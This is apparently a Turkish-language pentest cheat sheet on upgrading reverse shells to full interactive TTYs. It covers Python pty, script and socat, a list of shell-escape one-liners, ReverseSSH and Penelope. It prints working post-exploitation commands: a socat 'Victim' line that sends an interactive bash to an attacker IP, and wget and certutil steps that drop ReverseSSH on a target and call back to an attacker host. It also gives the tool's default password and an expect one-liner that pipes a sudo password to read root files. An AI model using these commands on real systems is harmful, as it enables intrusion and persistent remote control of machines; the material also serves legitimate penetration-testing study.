# Full TTYs

## Full TTY

`/etc/shells`, geçerli login-shell yollarını listeler ve bazı programlar tarafından kullanılır; PTY ayırmak için evrensel bir ön koşul değildir.<sup>[[3]](#references)[[4]](#references)</sup> `pkexec` gibi bir program `SHELL` değişkenini `The value for the SHELL variable was not found in the /etc/shells file` mesajıyla reddederse, tam shell yolunun (örneğin, `/bin/bash`) `/etc/shells` içinde bulunduğundan emin olun.<sup>[[10]](#references)</sup> Aşağıdaki `CTRL+Z`/`fg` kurtarma sıralaması Bash job control kullanır; mevcut shell Bash değilse, bu sıralamayı kullanmadan önce Bash başlatın.<sup>[[7]](#references)</sup>

#### Python

Python'un `pty.spawn` işlevi, bir programı mevcut işlemin standart input, output ve error akışlarına bağlı olarak başlatır; bu da bu oturumda Bash'e bir pseudo-terminal sağlar.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> **`stty -a`** çalıştırarak **satır** ve **sütun** **sayısını** öğrenebilirsiniz; `-a` mevcut tüm terminal ayarlarını yazdırır. Komutun çıktısı terminale özgüdür, bu nedenle geçerli oturum tarafından bildirilen değerleri kullanın.<sup>[[11]](#references)</sup>

#### script

`script` utility bir terminal oturumunu kaydeder; burada `/dev/null` typescript'i göz ardı eder, `-q` başlangıç ve tamamlanma mesajlarını bastırır ve `-c` varsayılan shell yerine Bash'i çalıştırır.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Her iki PTY-spawn yönteminden sonra Netcat oturumunu askıya alın ve yerel raw mode ile geri yükleyin; ardından uzak terminal ortamını ve boyutlarını ayarlayın:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Dinleyici mevcut terminali raw modda kullanır, yerel echo'yu devre dışı bırakır ve 4444 portundaki TCP bağlantılarını kabul eder. Victim komutu bir pty ayırır, stderr'yi birleştirir, bir session oluşturur, SIGINT'i iletir ve uygun terminal ayarlarını uygular; child'ın controlling terminal'a ihtiyacı varsa `ctty` ekleyin.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Shell oluşturma**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (eski sürümlerde `--interactive` ile): `!sh`

Nmap escape sürüme özeldir: Nmap sonraki sürümlerde `--interactive` modunu kaldırdı; bu nedenle `!sh` yalnızca eski sürümler için geçerlidir.<sup>[[13]](#references)</sup>

## ReverseSSH

**interactive shell access** sağlamanın yanı sıra **file transfers** ve **port forwarding** için de kullanışlı bir yöntem, statik olarak linklenmiş ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh)'ı hedef sisteme bırakmaktır.<sup>[[1]](#references)</sup>

Aşağıda, projenin yayımladığı UPX-compressed binary ile `x86` için bir örnek verilmiştir. Diğer mimariler veya release artifact'leri için [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) sayfasını kullanın.<sup>[[1]](#references)</sup>

1. Gelen SSH bağlantısını yakalayabilmesi için local host'u hazırlayın. Listener mode'da `-l` listener'ı etkinleştirir ve `-p 4444`, target'ın bağlantısını kabul edeceği port'u seçer.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux hedefi. Aynı `upx_reverse-sshx86` artifact'ini `/dev/shm/reverse-ssh` konumuna aktarın ve çalıştırılabilir hâle getirin. Hedefteki `-p 4444`, yukarıda belirtilen listener portunu seçer; `kali@10.0.0.2` ise bağlantının geri yapılacağı account ve host'u belirtir.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows target. Full interactive PowerShell requires Windows 10 build 17763; see the [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Windows örneğinde `certutil`, `-f -urlcache` seçenekleriyle kullanılır; Microsoft, `-f` seçeneğinin bir URL fetch işlemini zorladığını belirtir ve kullanılabilir parametrelerin sürüme göre değişebileceğini not eder. Bu biçim kullanılamıyorsa `certutil -?` komutunu kontrol edin.<sup>[[12]](#references)</sup>

- Reverse connection başarılı olduktan sonra ReverseSSH'nin reverse-mode listener'ı varsayılan olarak `8888` portuna (veya `-b` ile sağlanan değere) bağlanır ve gelen bağlantılar varsayılan parola olan `letmeinbrudipls` ile herhangi bir kullanıcı adını kabul eder. Remote shell, `reverse-ssh(.exe)` dosyasını başlatan hesabın ayrıcalıklarıyla çalışır.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope), Unix-like reverse shell'leri otomatik olarak PTY'ye yükseltir, Unix-like terminallerin boyutunu yeniden ayarlar ve shell etkileşimlerini kaydeder; Windows shell'leri için readline desteği sağlar, ancak gerçek zamanlı terminal yeniden boyutlandırması sunmaz.<sup>[[2]](#references)</sup>

Varsayılan olarak `penelope` komutunu `0.0.0.0:4444` üzerinde dinleyecek şekilde çalıştırın; ardından gelen Unix-like shell'ler otomatik olarak yükseltilebilir ve kaydedilebilir.<sup>[[2]](#references)</sup>

## No TTY

Herhangi bir nedenle tam bir TTY elde edemeseniz bile, **kullanıcı girdisi bekleyen programlarla etkileşim kurabilirsiniz**. Aşağıdaki örnekte Expect, `sudo`yu başlatır, parola istemini bekler, parolayı gönderir ve `interact` ile kontrolü geri verir; `sudo -S` parolasını standart girdiden okur. Bunu yalnızca yetkili bir lab ortamında kullanın ve gerçek kimlik bilgilerini shell geçmişine veya kaynak dosyalarına yerleştirmekten kaçının.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - CTF'ler ve benzeri işler için reverse shell işlevine sahip, statik olarak bağlanmış SSH sunucusu](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Hayatı kolaylaştırmak için bazı işlemleri otomatikleştiren shell handler](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python documentation](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux manual page](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux manual page](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash Reference Manual — Job Control](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux manual page](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux manual page](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap Change Log](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
